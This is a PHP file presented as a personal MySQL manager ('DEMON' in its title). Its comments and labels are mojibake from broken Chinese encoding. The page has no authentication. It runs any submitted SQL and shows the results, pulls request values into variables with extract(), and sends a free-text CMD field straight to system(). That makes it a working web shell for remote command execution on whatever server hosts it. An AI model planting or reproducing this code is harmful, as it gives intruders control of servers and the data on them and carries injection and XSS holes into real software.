<?php
#
#  ���ߣ�Demon
#  ʱ�䣺2018-1-13
#  ��ϵ��demonxian3@qq.com
#  ���ͣ�http://www.cnblogs.com/demonxian3
#  ���ܣ�Mysql���ݿ����ӣ�ִ��SQL���
#
session_start();
error_reporting(0);
extract($_GET);
extract($_POST);

$host = isset($_SESSION['myhostname'])?$_SESSION['myhostname']:"localhost";
$user = isset($_SESSION['myusername'])?$_SESSION['myusername']:"root";
$pass = isset($_SESSION['mypassword'])?$_SESSION['mypassword']:"";
$base = isset($_SESSION['mydatabase'])?$_SESSION['mydatabase']:"mysql";
$iscon = isset($_SESSION['isconnected'])?"���ݿ����ӳɹ�":"���ݿ���δ����";

?>


<meta http-equiv="content-type" content="text/html;charset=gb2312">
<title>Mysql������ - Demon</title>
<body>
<h1>DEMONר��Mysql������</h1><hr>

<form method='post' action=''>
<table>
<tr><td>HOST: </td><td><input id="host" name="my_hostname" value="<?php echo $host;?>" onclick="this.value=''" ></td></tr>
<tr><td>USER: </td><td><input id="user" name="my_username" value="<?php echo $user;?>" onclick="this.value=''" ></td></tr>
<tr><td>PASS: </td><td><input id="pass" name="my_password" value="<?php echo $pass;?>" onclick="this.value=''" ></td></tr>
<tr><td>BASE: </td><td><input id="base" name="my_database" value="<?php echo $base;?>" onclick="this.value=''" ></td></tr>
<input type="hidden" name="sqlcon" value="true">
</table>
<input id="subm" type="submit" value="�������ݿ�" style="width:200px;cursor:pointer"/>
</form>

<br><br>
ִ��SQL���<hr>
<form action='' method='post' style="z-index:3">
<textarea style="width:600px;height:250px;" name="SQL"><?php if(isset($SQL))echo $SQL;?></textarea>
<input type="submit" value="�ύ">
</form>
<div style="width:600px;border:1px solid #c3c3c3;">
<?php
if(isset($SQL)){

     #$SQL = addslashes($SQL);
     if(!($conn = mysql_connect($host,$user,$pass)))echo mysql_error();
     
     mysql_select_db($base);

     echo "��ִ�е�SQL����ǣ�".$SQL."<br>";

     $res = mysql_query($SQL);
     if(!$res)echo mysql_error();

     while($row = mysql_fetch_assoc($res)){
       
       foreach($row as $key => $value){
          echo "$value <br>";
       }
     }

     mysql_close();
}
?>
</div>

<?php

if(!isset($my_hostname))$my_hostname = 'localhost';
if(!isset($my_username))$my_username = 'root';
if(!isset($my_password))$my_password = '';
if(!isset($my_database))$my_database = 'mysql';

if($sqlcon){
  if(!($conn = mysql_connect($my_hostname,$my_username,$my_password)))echo mysql_error();
  $_SESSION['myhostname'] = $my_hostname;
  $_SESSION['myusername'] = $my_username;
  $_SESSION['mypassword'] = $my_password;
  $_SESSION['mydatabase'] = $my_database;
  $_SESSION['isconnected'] = "yes";
  echo "<p style='color:red'>���ݿ����ӳɹ�</p>";
  mysql_close();
}
?>



<br><br>
ִ��CMD���<hr>
<form action='' method='post' style="z-index:3">
<textarea style="width:600px;height:250px;" name="CMD">
<?php if(isset($CMD))echo $CMD;?>
</textarea>
<input type="submit" value="�ύ">
</form>
<div style="width:600px;border:1px solid #c3c3c3;">
<?php
if(isset($CMD)){
   echo "<pre>";
   $res = system($CMD);
   if($res)echo "-------����ִ�гɹ�<br>";
   echo "</pre>";
}
?>
</div>



